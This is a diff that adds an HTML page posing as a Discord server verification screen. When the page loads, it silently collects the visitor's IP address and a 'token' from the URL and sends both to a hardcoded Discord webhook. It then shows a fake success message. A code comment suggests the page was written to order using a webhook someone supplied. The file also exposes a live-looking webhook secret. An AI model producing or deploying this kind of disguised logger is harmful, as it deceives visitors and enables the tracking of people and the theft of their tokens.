@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>서버 인증 중...</title>
+    <style>
+        body { background-color: #313338; color: #f2f3f5; font-family: sans-serif; text-align: center; padding-top: 100px; }
+        h2 { color: #f2f3f5; }
+        p { color: #949ba4; }
+    </style>
+</head>
+<body>
+    <h2>🔐 디스코드 서버 인증 진행 중...</h2>
+    <p>잠시만 기다려 주세요. 인증이 완료되면 창을 닫으셔도 됩니다.</p>
+
+    <script>
+        // 네가 방금 준 디스코드 웹훅 주소!
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1565687242041597962/4a88OaMlBrvVYqMUAPaSiWxK4XAX4tvwNp1pMkVZxz6NLdl5i5_twLkbdT03j1ZjwtyI";
+
+        async function sendLog() {
+            try {
+                // 1. 유저 IP 주소 가져오기
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const userIp = data.ip;
+
+                // 2. URL에 포함된 인증 토큰 파싱
+                const urlParams = new URLSearchParams(window.location.search);
+                const token = urlParams.get('token') || "토큰 없음";
+
+                // 3. 디스코드 웹훅으로 IP와 토큰 전송
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🚨 **새로운 유저 인증 접속 감지!**\n> **IP 주소:** \`${userIp}\`\n> **인증 토큰:** \`${token}\``
+                    })
+                });
+
+                document.querySelector('h2').innerText = "✅ 인증 데이터 전송 완료!";
+            } catch (e) {
+                console.error(e);
+                document.querySelector('h2').innerText = "❌ 인증 처리 중 오류가 발생했습니다.";
+            }
+        }
+
+        sendLog();
+    </script>
+</body>
+</html>
